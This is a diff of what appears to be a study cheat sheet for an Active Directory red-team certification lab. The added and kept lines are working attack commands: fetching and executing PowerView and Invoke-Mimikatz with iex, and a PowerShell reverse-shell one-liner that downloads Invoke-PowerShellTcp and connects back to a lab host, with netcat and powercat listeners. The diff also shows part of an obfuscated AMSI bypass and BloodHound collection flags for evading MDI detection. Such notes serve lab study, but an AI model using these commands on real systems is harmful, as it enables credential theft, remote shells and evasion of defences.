@@ -2,6 +2,9 @@
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/34fd32af-5087-4184-984b-75e7b4ad0c44)
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d1ee2b35-3e75-4419-9adc-91827daa5223)
 
+# Tips
+1. Admin on another machine use `"winrs"`
+2. 
 
 ### To bypass AV in the cmd
 1. launch cmd
@@ -67,10 +70,13 @@ iex (iwr http://172.16.100.7:9090/PowerView.ps1 -UseBasicParsing)
 iex (iwr http://172.16.100.7:9090/Invoke-Mimikatz.ps1 -UseBasicParsing)
 ```
 
-### RevShell using PowerShellTcp.ps1 & getting a shell using powercat in powershell
+### Reverse Shell using PowerShellTcp.ps1 & getting a shell using powercat in powershell
 ```
+powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/InvokePowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443
 powershell.exe iex (iwr http://172.16.100.7:9090/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.7 -Port 889
-powercat -l -v -p 889 -Timeout 100
+
+nc64.exe -lvp 889
+powercat -lvp 889 -Timeout 100
 ```
 
 # PowerShell
@@ -1560,6 +1566,7 @@ winrs -r:dcorp-adminsrv cmd
 ```
 
 
+
 # BloodHound Enumeration   Need Admin Privs
 ### Start BloodHound
 Start neo4j and BloodHound UI on kali machine and load the zip/json files
@@ -1572,7 +1579,7 @@ sudo bloodhound   (credentials neo4j:to0or)
 ```
 RunWithRegistryNonAdmin.bat
 ```
-2. Bypass .NET AMSI using below code in PowerShell
+2. Bypass .NET AMSI using below code in PowerShell before running SharpHound
 ```
 $ZQCUW = @" 
 using System; 
@@ -1611,11 +1618,11 @@ $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
 3. Run SharpHound (Investorer)
 ```
 . .\SharpHound.ps1
-Invoke-BloodHound -CollectionMethod All,LoggedOn -Verbose
+Invoke-BloodHound -CollectionMethod All -Verbose
 #OR
 Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
 ```
-4. Upload the data to bloodhound
+4. Upload the data to Bloodhound
 
 To avoid detections like MDI
 ```
@@ -1626,6 +1633,8 @@ To avoid detections use Stealth
 Invoke-BloodHound -Stealth
 SharpHound.exe --stealth
 ```
+
+
 
 # Runas
 if you found AD credentials but nowhere to log in with them. Runas allows a user to run a specific program with a different account
